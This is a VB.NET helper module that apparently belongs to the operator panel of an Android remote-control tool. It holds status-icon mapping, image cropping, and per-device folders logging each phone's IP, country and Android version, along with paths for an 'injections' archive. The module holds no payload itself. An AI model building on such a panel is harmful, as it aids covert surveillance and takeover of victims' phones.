Imports System.Drawing.Drawing2D
Imports System.IO

Module MyRes
    Public ReadOnly Resources_Path As String = Application.StartupPath + "\Resources"
    Public ReadOnly Flags_Path As String = Application.StartupPath & "\Resources\Flags"
    Public ReadOnly Fonts_Path As String = Application.StartupPath & "\Resources\Font"
    Public ReadOnly NotesDirectory As String = Application.StartupPath & "\Resources\Notes"
    Public ReadOnly USERS_Path As String = Application.StartupPath & "\Resources\USERS"
    Public ReadOnly TAGS_path As String = Application.StartupPath & "\Resources\USERS\tags.json"
    Public ReadOnly USERS_cache_Path As String = Application.StartupPath & "\Resources\USERS\cache"
    Public ReadOnly injections_Zip As String = Application.StartupPath & "\Resources\jects.zip"
    Public ReadOnly injections_Path As String = Application.StartupPath & "\Resources\injections"
    Public ReadOnly StoreCash_Path As String = Application.StartupPath & "\Resources\Store\temp"

    Public ReadOnly Sounds_Path As String = Application.StartupPath & "\Resources\sounds"
    Public ReadOnly Apps_Path As String = Application.StartupPath & "\Resources\Apps"
    Public ReadOnly GEOIP_Path As String = Application.StartupPath & "\Resources\GeoIP\GeoIP.dat"
    Public ReadOnly GEOIP_Citys_Path As String = Application.StartupPath & "\Resources\GeoIP\GeoIPCity.dat"


    Public ReadOnly SupportedImages As String = ".png,.gif,.bmp,.ico,.jpeg,.jpg,.jpeg,.webp,.heic,heif"
    Public ReadOnly SupportedVideo As String = ".3gp,.mp4,.m4v,.mkv,.mov,.wmv"

    Public ReadOnly tools_Path As String = Application.StartupPath & "\Resources\tools"
    Public ReadOnly adb_Path As String = Application.StartupPath & "\Resources\tools\adb.exe"
    Public ReadOnly adb_lib1 As String = Application.StartupPath & "\Resources\tools\AdbWinApi.dll"
    Public ReadOnly adb_libusb As String = Application.StartupPath & "\Resources\tools\AdbWinUsbApi.dll"

    Public Function GetScreen(ByVal C As String) As Bitmap
        Dim sc As Bitmap
        Select Case C.Trim
            Case "0"
                sc = My.Resources.on_lock
            Case "1"
                sc = My.Resources.off_lock
            Case "2"
                sc = My.Resources.scr_on
            Case "3"
                sc = My.Resources.scr_off
            Case Else
                sc = My.Resources.off_lock
        End Select
        Return sc
    End Function
    Public Function GetBattery(Changestate As String) As Bitmap
        Dim BT As Bitmap
        Dim batteryLevel As Integer = CInt(Changestate)

        Select Case batteryLevel
            Case Is <= 20
                BT = My.Resources.battery_low
            Case 21 To 40
                BT = My.Resources.battery_mid_mins
            Case 41 To 60
                BT = My.Resources.battery_mid
            Case 61 To 80
                BT = My.Resources.battery_mid_plus
            Case Else ' Covers 81 to 100
                BT = My.Resources.battery_full
        End Select

        Return BT
    End Function

    Public Function GetWallpaper(ByVal imgBase64 As String, ByVal xx As Integer, ByVal yy As Integer) As Bitmap
        Dim t As String = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
        If Not imgBase64 = "-1" Or imgBase64 = "" Then
            'Dim c() As Byte = Convert.FromBase64String(imgBase64)
            'Dim m As New IO.MemoryStream(c)
            'Dim h As New Bitmap(Image.FromStream(m))
            'Dim w As Integer = h.Size.Width
            'Dim s As Integer = h.Size.Height
            'If w = xx And s = yy Then
            '    t = imgBase64
            'End If
            'h.Dispose()
            'm.Dispose()
            t = imgBase64
        End If
        Return FormatImg(t, xx, yy)
    End Function
    Private Function FormatImg(ByVal imagebase64 As String, ByVal xx As Integer, ByVal yy As Integer) As Bitmap

        Dim m As New IO.MemoryStream(Convert.FromBase64String(imagebase64))
        Dim b As New Bitmap(Image.FromStream(m))
        m.Dispose()
        'Return New Bitmap(CropToCircle(b))
        Return CropImageToCircle(b, New Size(xx, yy))

    End Function
    Public Function CropImageToCircle(ByVal inputImage As Image, ByVal size As Size) As Image
        Dim circleImage As New Bitmap(size.Width, size.Height)

        Using g As Graphics = Graphics.FromImage(circleImage)
            ' Set high-quality rendering
            g.SmoothingMode = SmoothingMode.HighSpeed
            g.InterpolationMode = InterpolationMode.Low
            g.CompositingQuality = CompositingQuality.HighSpeed
            g.Clear(Color.Transparent)

            ' Create circular clipping region
            Using path As New Drawing2D.GraphicsPath()
                path.AddEllipse(0, 0, size.Width, size.Height)
                g.SetClip(path)

                ' Determine square crop from center
                Dim sideLength As Integer = Math.Min(inputImage.Width, inputImage.Height)
                Dim cropX As Integer = (inputImage.Width - sideLength) \ 2
                Dim cropY As Integer = (inputImage.Height - sideLength) \ 2
                Dim srcRect As New Rectangle(cropX, cropY, sideLength, sideLength)

                ' Destination rectangle
                Dim destRect As New Rectangle(0, 0, size.Width, size.Height)

                ' Draw the cropped image
                g.DrawImage(inputImage, destRect, srcRect, GraphicsUnit.Pixel)
            End Using
        End Using

        Return circleImage
    End Function


    'Public Function CropToCircle(ByVal srcImage As Image) As Image
    '    Dim originalImage = srcImage
    '    Dim croppedImage As New Bitmap(originalImage.Width, originalImage.Height)

    '    Using g = Graphics.FromImage(croppedImage)
    '        Dim path As New GraphicsPath

    '        g.SmoothingMode = Drawing2D.SmoothingMode.HighQuality
    '        path.AddEllipse(0, 0, croppedImage.Width, croppedImage.Height)

    '        Dim reg As New System.Drawing.Region(path)
    '        g.Clip = reg
    '        g.DrawImage(originalImage, Point.Empty)
    '        reg.Dispose()
    '        path.Dispose()
    '    End Using
    '    srcImage.Dispose()
    '    originalImage.Dispose()

    '    Return croppedImage
    'End Function
    Public Function NetworkType(value As String) As Bitmap
        Select Case value

            Case "WIFI"
                Return My.Resources.wifi
            Case "VPN"
                Return My.Resources.net_vpn
            Case "2G"
                Return My.Resources.net_2g
            Case "3G"
                Return My.Resources.net_3g
            Case "4G"
                Return My.Resources.net_4g
            Case "5G"
                Return My.Resources.net_5g
            Case Else
                Return My.Resources.wifi
        End Select

    End Function
    Public Function CreateCilentfolder(ClassClient As BTClient) As String
        Dim TargetPath As String = USERS_Path & "\" & ClassClient.mobid
        Try
            If Not Directory.Exists(TargetPath) Then
                Directory.CreateDirectory(TargetPath)
            End If

            If Not File.Exists(TargetPath & "\" & "User.inf") Then
                File.Create(TargetPath & "\" & "User.inf").Dispose()
            End If

            ' Write data to User.inf
            File.WriteAllText(TargetPath & "\" & "User.inf",
                          "Name:" + ClassClient.name + vbNewLine +
                          "ID:" + ClassClient.mobid + vbNewLine +
                          "IP:" + ClassClient.address + vbNewLine +
                          "Country:" + ClassClient.country + vbNewLine +
                          "Android:" + ClassClient.android)

            ' Check for options.json and create if not found
            Dim optionsFilePath As String = TargetPath & "\" & "options.json"
            If Not File.Exists(optionsFilePath) Then

                File.WriteAllText(optionsFilePath, BTRegistry.GetValue(BTSettings.Defconfig, My.Resources.Deafult_mob_optns))
            End If


        Catch ex As Exception
            ' Handle exception as needed
            MsgBox("Error Create folder " & ex.Message)
        End Try
        Return TargetPath
    End Function
    Public Function ISupportedImages(ByVal t As String) As Boolean
        If t.Contains(".") Then
            Dim ext As String = t.Substring(t.LastIndexOf("."))
            If SupportedImages.Contains(ext) Then
                Return True
            Else
                Return False
            End If
        Else
            Return False
        End If
        Return False
    End Function
    Public Function ISupportedVideo(ByVal t As String) As Boolean
        If t.Contains(".") Then
            Dim ext As String = t.Substring(t.LastIndexOf("."))
            If SupportedVideo.Contains(ext) Then
                Return True
            Else
                Return False
            End If
        Else
            Return False
        End If
        Return False
    End Function
End Module
